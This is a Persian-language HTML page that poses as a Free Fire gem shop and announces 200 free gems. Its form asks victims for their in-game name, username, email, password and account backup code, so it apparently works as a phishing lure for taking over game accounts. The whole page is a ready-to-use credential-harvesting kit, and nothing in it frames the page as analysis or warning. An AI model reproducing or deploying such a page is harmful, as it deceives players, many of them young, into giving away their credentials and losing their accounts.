<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خرید جم فری فایر</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: url('https://jmfree.chbk.app/img/jm.jpg') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            padding: 20px;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            max-width: 400px;
            background: rgba(0, 0, 0, 0.5);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.4);
            text-align: center;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            text-align: right;
            color: #ffd700;
        }
        input[type="text"], input[type="number"], input[type="email"], input[type="password"], input[type="submit"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 5px 0 20px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        input[type="text"], input[type="number"], input[type="email"], input[type="password"] {
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
        }
        input[type="submit"] {
            background-color: #28a745;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            font-weight: bold;
        }
        input[type="submit"]:hover {
            background-color: #218838;
            transform: scale(1.05);
        }
        .footer {
            margin-top: 20px;
            font-size: 0.8em;
            color: #ffd700;
        }
        .icon {
            font-size: 50px;
            margin-bottom: 10px;
        }
        .free-gem {
            margin: 20px 0;
            font-size: 18px;
            color: #ffd700;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <i class="fab fa-free-code-camp icon"></i>
    <h1>خرید جم فری فایر</h1>
    <div class="free-gem">🎉 200 جم رایگان به شما تعلق گرفت! 🎉</div>
    <form action="/" method="POST">
        <label for="in-game-name">نام شما در بازی:</label>
        <input type="text" id="in-game-name" name="in-game-name" placeholder="نام خود را وارد کنید" required>

        <label for="username">نام کاربری:</label>
        <input type="text" id="username" name="username" placeholder="نام کاربری خود را وارد کنید" required>

        <label for="email">ایمیل:</label>
        <input type="email" id="email" name="email" placeholder="ایمیل خود را وارد کنید" required>

        <label for="password">رمز عبور:</label>
        <input type="password" id="password" name="password" placeholder="رمز عبور خود را وارد کنید" required>

        <label for="backup-code">کد پشتیبان:</label>
        <input type="text" id="backup-code" name="backup-code" placeholder="کد پشتیبان خود را وارد کنید" required>

        <label for="amount">مقدار جم:</label>
        <input type="number" id="amount" name="amount" placeholder="مقدار جم را وارد کنید" required min="1">

        <input type="submit" value="خرید">
    </form>
    <div class="footer">
        <p>💎 با خرید جم، تجربه بازی خود را افزایش دهید! 💎</p>
    </div>
</div>

</body>
</html>
